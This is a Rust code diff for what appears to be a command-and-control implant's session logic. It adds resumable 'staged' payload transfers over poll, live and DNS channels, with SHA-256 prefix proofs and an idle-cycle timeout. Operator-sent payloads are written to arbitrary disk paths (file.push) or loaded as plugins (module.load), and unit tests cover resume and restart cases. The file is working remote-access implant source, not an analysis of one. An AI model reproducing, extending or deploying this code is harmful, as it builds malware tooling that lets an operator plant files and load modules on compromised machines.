@@ -1,23 +1,46 @@
 use prost::Message;
+use sha2::{Digest, Sha256};
+use std::collections::BTreeMap;
 
 use crate::channel::{self, Channels};
 use crate::envelope;
-use crate::handlers::{self, Cadence};
+use crate::handlers::{self, Cadence, Outcome};
 use crate::outbox::Outbox;
 use crate::plugins::Plugins;
 use crate::trust::Certificate;
 use crate::verify::{self, NonceTracker, Verdict};
 use crate::wire::{
     ChannelOutput, Frame, FrameKind, HandshakeRequest, HandshakeResponse, ProtocolVersion,
-    TaskRequest,
+    StagedChunk, StagedPull, TaskRequest,
 };
+
+/// One staged task's transfer state (ADR-010): the tasking, the bytes an
+/// interrupted run already placed, and the running SHA-256 over exactly those
+/// bytes -- the prefix proof the next demand carries. Lives on the session,
+/// so it survives carriage switches, reconnects, and failed attempts: the
+/// whole of the resume arm's client-side state.
+struct StagedPending {
+    task: TaskRequest,
+    held: Vec<u8>,
+    hasher: Sha256,
+    /// Bytes held when the last cycle closed: the no-progress guard's
+    /// reference point.
+    last_len: usize,
+    idle_cycles: u32,
+}
+
+/// Cycles a staged transfer may make no progress before its task fails: an
+/// honest interruption resumes, a carrier that never serves the demand
+/// surfaces on the task instead of parking it forever.
+const STAGED_IDLE_CYCLES: u32 = 3;
 
 /// Everything a contact carriage needs to serve one run: identity, the
 /// advertisement, the live cadence, the seal, the signer pool, and the
-/// cross-carriage task state (nonce floor, ledger, batch). Carriages borrow
-/// the session; the session owns nothing transport-shaped. The nonce floor
-/// deliberately spans carriages and reconnects -- the server's counter is
-/// per-implant, so a replay through any door falls at the same floor.
+/// cross-carriage task state (nonce floor, ledger, batch, staged transfers).
+/// Carriages borrow the session; the session owns nothing transport-shaped.
+/// The nonce floor deliberately spans carriages and reconnects -- the
+/// server's counter is per-implant, so a replay through any door falls at the
+/// same floor.
 pub struct Session {
     pub implant_id: String,
     advertised: Vec<String>,
@@ -29,6 +52,7 @@ pub struct Session {
     pub nonces: NonceTracker,
     pub outbox: Outbox,
     pub channels: Channels,
+    staged: BTreeMap<String, StagedPending>,
     contact_counter: u64,
 }
 
@@ -51,6 +75,16 @@ impl Seal {
     pub fn open(&self, body: &[u8], aad: &str) -> Option<Vec<u8>> {
         envelope::try_open_contact_body(body, &self.key_id, &self.key, aad)
     }
+}
+
+/// Lowercase hex of a 32-byte SHA-256 digest.
+fn hex_sha256(digest: &[u8]) -> String {
+    let mut text = String::with_capacity(64);
+    for byte in digest {
+        use std::fmt::Write as _;
+        let _ = write!(text, "{byte:02x}");
+    }
+    text
 }
 
 /// What the run loop does after one contact attempt.
@@ -99,6 +133,7 @@ impl Session {
             nonces: NonceTracker::default(),
             outbox: Outbox::default(),
             channels: Channels::new(),
+            staged: BTreeMap::new(),
             contact_counter: 0,
         }
     }
@@ -213,16 +248,16 @@ impl Session {
     /// verification first (the replay defense stays ahead of the ledger),
     /// then dedup from the cache, then dispatch. Results and exfil chunks
     /// queue into the batch; the delivery mark is the carriage's to set.
+    ///
+    /// A staged task registers its transfer instead of executing: the
+    /// payload is demanded before the verb can run, and the demand is
+    /// carriage-shaped (the poll batch's pull frames, the live connection's
+    /// blocking exchange, the DNS token download). Registration sits behind
+    /// the same verification as every other acceptance -- staged tasking
+    /// verifies before anything executes, the Tier 1 posture.
     pub fn accept(&mut self, task: &TaskRequest, acks: bool) {
         if acks {
             self.outbox.acknowledge(&task.task_id);
-        }
-        if task.staged_bytes.is_some() {
-            // The staged arm is carriage-specific: the poll batch defers the
-            // pull to its next cycle, the stream pulls inline. Both reach
-            // this method only after their own staged handling, so landing
-            // here with the flag set means the carriage declined it.
-            return;
         }
         let verdict = verify::verify(&self.implant_id, task, &self.signer_pool, &mut self.nonces);
         match verdict {
@@ -230,10 +265,14 @@ impl Session {
                 if self.outbox.holds(&task.task_id) {
                     // The dedup half: a redelivery is answered from the cache
                     // (or, while unfinished, merely re-acked) -- nothing
-                    // re-executes.
+                    // re-executes, a completed staged task included.
                     if let Some((outcome, output)) = self.outbox.cached(&task.task_id) {
                         self.outbox.result(&task.task_id, outcome, &output);
                     }
+                    return;
+                }
+                if task.staged_bytes.is_some() {
+                    self.demand_staged(task.clone());
                     return;
                 }
                 if self.channels.holds(&task.task_id) {
@@ -283,6 +322,240 @@ impl Session {
                 self.outbox
                     .result(&task.task_id, crate::handlers::Outcome::Failed, &cause);
             }
+        }
+    }
+
+    // --- The staged transfer state (ADR-010): registration, demands,
+    // placement, and the terminal dispatch -- one implementation every
+    // carriage shares, because the transfer outlives any one of them.
+
+    /// Registers a verified staged task's transfer. Idempotent: a redelivered
+    /// staged task re-demands from what is already held.
+    fn demand_staged(&mut self, task: TaskRequest) {
+        self.staged
+            .entry(task.task_id.clone())
+            .or_insert_with(|| StagedPending {
+                task,
+                held: Vec::new(),
+                hasher: Sha256::new(),
+                last_len: 0,
+                idle_cycles: 0,
+            });
+    }
+
+    /// Whether a staged transfer is pending for the task -- the live
+    /// carriages' signal that a just-accepted staged task needs its inline
+    /// pull exchange.
+    pub fn staged_holds(&self, task_id: &str) -> bool {
+        self.staged.contains_key(task_id)
+    }
+
+    /// The pending transfers' task ids in demand order -- the live carriages
+    /// re-drive these after a reconnect, because an acked staged task never
+    /// redelivers.
+    pub fn staged_pending(&self) -> Vec<String> {
+        self.staged.keys().cloned().collect()
+    }
+
+    /// One transfer's demand frame: a fresh transfer sends the plain shape, a
+    /// resumed one names the bytes it holds and proves them by hash.
+    pub(crate) fn staged_pull_frame(&self, task_id: &str) -> Option<Frame> {
+        let pending = self.staged.get(task_id)?;
+        let (offset, prefix_sha256) = if pending.held.is_empty() {
+            (None, None)
+        } else {
+            let proof = pending.hasher.clone();
+            (
+                Some(pending.held.len() as u64),
+                Some(proof.finalize().to_vec()),
+            )
+        };
+        Some(Frame {
+            payload: StagedPull {
+                task_id: task_id.to_string(),
+                offset,
+                prefix_sha256,
+            }
+            .encode_to_vec(),
+            kind: FrameKind::StagedPull as i32,
+        })
+    }
+
+    /// The demand frames this poll cycle carries: one per pending transfer,
+    /// each at its current seam. Regenerated every cycle -- a cycle that dies
+    /// mid-run leaves the held bytes in place, so the next demand resumes
+    /// instead of re-serving the payload whole.
+    pub fn staged_demands(&self) -> Vec<Frame> {
+        self.staged
+            .keys()
+            .filter_map(|id| self.staged_pull_frame(id))
+            .collect()
+    }
+
+    /// One transfer's seam -- the DNS carriage's demand grammar carries the
+    /// pair in its query name instead of a frame.
+    pub fn staged_seam(&self, task_id: &str) -> (u64, Option<Vec<u8>>) {
+        match self.staged.get(task_id) {
+            Some(pending) if !pending.held.is_empty() => {
+                let proof = pending.hasher.clone();
+                (pending.held.len() as u64, Some(proof.finalize().to_vec()))
+            }
+            _ => (0, None),
+        }
+    }
+
+    /// Places one chunk of a staged transfer. A chunk naming its absolute
+    /// offset places there: offset 0 over a non-empty hold is the server's
+    /// restart signal and resets the transfer, a chunk the hold already
+    /// covers is a duplicate no-op, and a gap is left unplaced -- the next
+    /// demand re-establishes the seam. A chunk without the field comes from
+    /// a pre-resume server: sequence 0 over a non-empty hold restarts,
+    /// anything else appends in arrival order. The terminal chunk dispatches
+    /// the task against the held bytes and reports the payload's hash with
+    /// the result -- the both-side arm's implant half.
+    pub fn accept_staged_chunk(&mut self, chunk: &StagedChunk) {
+        let Some(mut pending) = self.staged.remove(&chunk.task_id) else {
+            return;
+        };
+        let data = chunk.data.as_ref();
+        match chunk.offset {
+            Some(offset) if offset as usize == pending.held.len() => {
+                pending.hasher.update(data);
+                pending.held.extend_from_slice(data);
+            }
+            Some(0) if !pending.held.is_empty() => {
+                // The server restarted the transfer whole.
+                pending.held.clear();
+                pending.hasher = Sha256::new();
+                pending.hasher.update(data);
+                pending.held.extend_from_slice(data);
+            }
+            Some(offset) if offset as usize + data.len() <= pending.held.len() => {
+                // An already-covered duplicate: placement is a no-op, the
+                // terminal flag still resolves the transfer.
+            }
+            Some(_) => {
+                // A gap the hold cannot place: keep the state, re-demand.
+                self.staged.insert(chunk.task_id.clone(), pending);
+                return;
+            }
+            None if chunk.sequence == 0 && !pending.held.is_empty() => {
+                pending.held.clear();
+                pending.hasher = Sha256::new();
+                pending.hasher.update(data);
+                pending.held.extend_from_slice(data);
+            }
+            None => {
+                pending.hasher.update(data);
+                pending.held.extend_from_slice(data);
+            }
+        }
+
+        if !chunk.terminal {
+            self.staged.insert(chunk.task_id.clone(), pending);
+            return;
+        }
+
+        let finalized = pending.hasher.clone();
+        let payload_sha = hex_sha256(&finalized.finalize());
+        let (outcome, output) =
+            self.dispatch_staged(&pending.task.verb, &pending.task.arguments, &pending.held);
+        self.outbox
+            .result_with_payload_sha(&chunk.task_id, outcome, &output, &payload_sha);
+    }
+
+    /// The cycle boundary every poll carriage runs after its response: a
+    /// transfer that grew keeps its patience, one that made no progress
+    /// counts an idle cycle, and one idle past the bound fails its task --
+    /// the honest end of a demand the carrier never served.
+    pub fn staged_cycle_end(&mut self) {
+        let ids: Vec<String> = self.staged.keys().cloned().collect();
+        for id in ids {
+            let Some(mut pending) = self.staged.remove(&id) else {
+                continue;
+            };
+            if pending.held.len() > pending.last_len {
+                pending.last_len = pending.held.len();
+                pending.idle_cycles = 0;
+                self.staged.insert(id, pending);
+            } else if pending.idle_cycles + 1 >= STAGED_IDLE_CYCLES {
+                self.outbox.result(
+                    &id,
+                    Outcome::Failed,
+                    "staged payload stream ended without a terminal chunk",
+                );
+            } else {
+                pending.idle_cycles += 1;
+                self.staged.insert(id, pending);
+            }
+        }
+    }
+
+    /// The staged dispatch arm: the payload arrived, the arguments carry the
+    /// grammar. file.push lands bytes on disk; module.load hands them to the
+    /// plugin loader (architecture.md Sec 5.4). Anything else fails with the
+    /// grammar named.
+    fn dispatch_staged(
+        &mut self,
+        verb: &str,
+        arguments: &str,
+        payload: &[u8],
+    ) -> (Outcome, String) {
+        let Some(space) = arguments.rfind(' ') else {
+            return (
+                Outcome::Failed,
+                format!("{verb} staged expects '<...> sha256:<hex>'"),
+            );
+        };
+        let head = arguments[..space].trim();
+        let Some(expected) = arguments[space + 1..].trim().strip_prefix("sha256:") else {
+            return (
+                Outcome::Failed,
+                format!("{verb} staged expects '<...> sha256:<hex>'"),
+            );
+        };
+        let actual = hex_sha256(&Sha256::digest(payload));
+        if !actual.eq_ignore_ascii_case(expected) {
+            return (
+                Outcome::Failed,
+                format!(
+                    "{verb} staged: payload hash mismatch: expected {expected}, received {actual}"
+                ),
+            );
+        }
+        if verb == "module.load" {
+            let name = head.trim();
+            if name.is_empty() {
+                return (
+                    Outcome::Failed,
+                    "module.load staged expects '<name> sha256:<hex>'".into(),
+                );
+            }
+            return match self.plugins.load(name, payload, expected) {
+                Ok(report) => {
+                    // The routes widened: the next contact advertises them.
+                    self.sync_module_advertisements();
+                    (Outcome::Succeeded, report)
+                }
+                Err(cause) => (Outcome::Failed, cause),
+            };
+        }
+        if verb != "file.push" {
+            return (
+                Outcome::Failed,
+                format!("{verb}: this build carries no staged handler for the verb"),
+            );
+        }
+        let path = head;
+        if let Some(parent) = std::path::Path::new(path).parent() {
+            let _ = std::fs::create_dir_all(parent);
+        }
+        match std::fs::write(path, payload) {
+            Ok(()) => (
+                Outcome::Succeeded,
+                format!("{path}: {} bytes written", payload.len()),
+            ),
+            Err(err) => (Outcome::Failed, format!("write {path}: {err}")),
         }
     }
 
@@ -336,6 +609,51 @@ mod tests {
         HandshakeRequest::decode(session.handshake_frame().payload.as_ref())
             .expect("the handshake decodes")
             .capabilities
+    }
+
+    /// A session whose verifier pool holds one RSA key, plus a signed staged
+    /// file.push task whose arguments' sha256 token names `payload` -- the
+    /// fixture the transfer tests run.
+    fn staged_session(payload: &[u8]) -> (Session, TaskRequest) {
+        let sha = hex_sha256(&Sha256::digest(payload));
+        let mut rng = rand::thread_rng();
+        let private = rsa::RsaPrivateKey::new(&mut rng, 2048).expect("rsa keygen");
+        let spki = private
+            .to_public_key()
+            .to_public_key_der()
+            .expect("spki der");
+        let signer = Certificate {
+            spki: spki.as_bytes().to_vec(),
+        };
+        let mut session =
+            Session::new("i-1".into(), &[], cadence(), vec![signer], None, None, true);
+        let task = TaskRequest {
+            task_id: "st-1".into(),
+            verb: "file.push".into(),
+            arguments: format!("/tmp/rod-staged-test sha256:{sha}"),
+            staged_bytes: Some(payload.len() as u64),
+            ..Default::default()
+        };
+        let canonical =
+            verify::canonical_bytes("i-1", &task.task_id, &task.verb, &task.arguments, None);
+        let signing = rsa::pss::SigningKey::<sha2::Sha256>::new(private);
+        let mut rng = rand::thread_rng();
+        let signed = TaskRequest {
+            signature: signing.sign_with_rng(&mut rng, &canonical).to_vec(),
+            ..task
+        };
+        session.accept(&signed, false);
+        (session, signed)
+    }
+
+    fn chunk(task: &str, sequence: u64, offset: u64, terminal: bool, data: &[u8]) -> StagedChunk {
+        StagedChunk {
+            task_id: task.into(),
+            sequence,
+            terminal,
+            data: data.to_vec(),
+            offset: Some(offset),
+        }
     }
 
     #[test]
@@ -530,5 +848,159 @@ mod tests {
         let cached = TaskResult::decode(second[1].payload.as_ref()).expect("the cached result");
         assert_eq!(cached.task_id, executed.task_id);
         assert_eq!(cached.output, executed.output);
+    }
+
+    #[test]
+    fn staged_tasking_verifies_before_registering() {
+        // Unsigned staged tasking fails closed: no transfer registers, the
+        // rejection queues -- the staged arm sits behind the same Tier 1
+        // verification as every other acceptance.
+        let mut session = bare_session(None);
+        let task = TaskRequest {
+            task_id: "st-1".into(),
+            verb: "file.push".into(),
+            arguments: "/tmp/rod-staged-test sha256:abc".into(),
+            staged_bytes: Some(2048),
+            ..Default::default()
+        };
+        session.accept(&task, false);
+        assert!(!session.staged_holds(&task.task_id));
+        let batch = session.outbox.batch();
+        let result = TaskResult::decode(batch[0].payload.as_ref()).expect("the result decodes");
+        assert_eq!(result.outcome, 2);
+        assert!(result.output.contains("signature"), "{}", result.output);
+    }
+
+    #[test]
+    fn staged_transfers_resume_from_the_held_seam() {
+        let payload: Vec<u8> = (0..2500u32).map(|i| i as u8).collect();
+        let (mut session, task) = staged_session(&payload);
+        assert!(session.staged_holds(&task.task_id));
+
+        // The fresh demand carries the plain shape: no offset, no proof.
+        let fresh = session.staged_demands();
+        assert_eq!(fresh.len(), 1);
+        let pull = StagedPull::decode(fresh[0].payload.as_ref()).expect("the demand decodes");
+        assert_eq!(pull.offset, None);
+        assert_eq!(pull.prefix_sha256, None);
+
+        // An interrupted run placed the first thousand bytes.
+        session.accept_staged_chunk(&chunk("st-1", 0, 0, false, &payload[..1000]));
+        let (offset, proof) = session.staged_seam("st-1");
+        assert_eq!(offset, 1000);
+        let expected_proof = Sha256::digest(&payload[..1000]);
+        assert_eq!(proof, Some(expected_proof.to_vec()));
+
+        // The next demand names those bytes and proves them; the remainder
+        // places at the seam and the terminal dispatches with the payload's
+        // hash on the result -- the both-side arm.
+        let resumed = session.staged_demands();
+        let pull = StagedPull::decode(resumed[0].payload.as_ref()).expect("the demand decodes");
+        assert_eq!(pull.offset, Some(1000));
+        assert_eq!(
+            pull.prefix_sha256.as_deref(),
+            Some(expected_proof.as_ref())
+        );
+        session.accept_staged_chunk(&chunk("st-1", 0, 1000, true, &payload[1000..]));
+        assert!(!session.staged_holds("st-1"));
+
+        let batch = session.outbox.batch();
+        let result = TaskResult::decode(batch[0].payload.as_ref()).expect("the result decodes");
+        assert_eq!(result.outcome, 1, "{}", result.output);
+        assert_eq!(
+            result.payload_sha256.as_deref(),
+            Some(hex_sha256(&Sha256::digest(&payload)).as_str())
+        );
+    }
+
+    #[test]
+    fn staged_restart_on_offset_zero_resets_the_transfer() {
+        // The task's arguments bind the payload the server restarts with;
+        // the bytes an aborted first attempt placed are the ones discarded.
+        let payload = b"the restarted payload";
+        let (mut session, _) = staged_session(payload);
+        session.accept_staged_chunk(&chunk("st-1", 0, 0, false, b"bytes the restart discards"));
+        // The server rejected the seam (or a pre-resume server answered the
+        // whole run): offset 0 names a restart, not an append.
+        session.accept_staged_chunk(&chunk("st-1", 0, 0, true, payload));
+        assert!(!session.staged_holds("st-1"));
+        let batch = session.outbox.batch();
+        let result = TaskResult::decode(batch[0].payload.as_ref()).expect("the result decodes");
+        assert_eq!(result.outcome, 1, "{}", result.output);
+        assert_eq!(
+            result.payload_sha256.as_deref(),
+            Some(hex_sha256(&Sha256::digest(payload)).as_str())
+        );
+    }
+
+    #[test]
+    fn staged_sequence_zero_on_a_legacy_server_resets_the_transfer() {
+        // A pre-resume server never sends the offset field: its full run
+        // restarts at sequence 0, which over a non-empty hold is the reset
+        // signal, and later chunks append in arrival order.
+        let payload = b"the whole run from a legacy server";
+        let (mut session, _) = staged_session(payload);
+        // A resumed attempt had placed foreign bytes at 0 before the legacy
+        // server answered the demand with a full offset-less run.
+        session.accept_staged_chunk(&chunk("st-1", 0, 0, false, b"a partial from earlier"));
+        let legacy = StagedChunk {
+            task_id: "st-1".into(),
+            sequence: 0,
+            terminal: false,
+            data: payload[..10].to_vec(),
+            offset: None,
+        };
+        session.accept_staged_chunk(&legacy);
+        session.accept_staged_chunk(&StagedChunk {
+            task_id: "st-1".into(),
+            sequence: 1,
+            terminal: true,
+            data: payload[10..].to_vec(),
+            offset: None,
+        });
+        let batch = session.outbox.batch();
+        let result = TaskResult::decode(batch[0].payload.as_ref()).expect("the result decodes");
+        assert_eq!(result.outcome, 1, "{}", result.output);
+        assert_eq!(
+            result.payload_sha256.as_deref(),
+            Some(hex_sha256(&Sha256::digest(payload)).as_str())
+        );
+    }
+
+    #[test]
+    fn staged_gap_keeps_the_hold_and_the_idle_guard_fails_the_task() {
+        let payload = vec![7u8; 4096];
+        let (mut session, task) = staged_session(&payload);
+        // A chunk past the seam is a gap: nothing places, the transfer keeps
+        // its state for the next demand.
+        session.accept_staged_chunk(&chunk("st-1", 9, 9000, false, &[1, 2, 3]));
+        assert!(session.staged_holds(&task.task_id));
+
+        // Three cycles without progress end the task honestly.
+        session.staged_cycle_end();
+        session.staged_cycle_end();
+        assert!(session.staged_holds(&task.task_id));
+        session.staged_cycle_end();
+        assert!(!session.staged_holds(&task.task_id));
+        let batch = session.outbox.batch();
+        let result = TaskResult::decode(batch[0].payload.as_ref()).expect("the result decodes");
+        assert_eq!(result.outcome, 2);
+        assert!(result.output.contains("ended without a terminal chunk"));
+
+        // A transfer that grows keeps its patience.
+        let (mut growing, _) = staged_session(&payload);
+        growing.accept_staged_chunk(&chunk("st-1", 0, 0, false, &payload[..512]));
+        for round in 0..5 {
+            growing.staged_cycle_end();
+            let from = 512 + round * 512;
+            growing.accept_staged_chunk(&chunk(
+                "st-1",
+                1,
+                from as u64,
+                false,
+                &payload[from..from + 512],
+            ));
+        }
+        assert!(growing.staged_holds("st-1"));
     }
 }
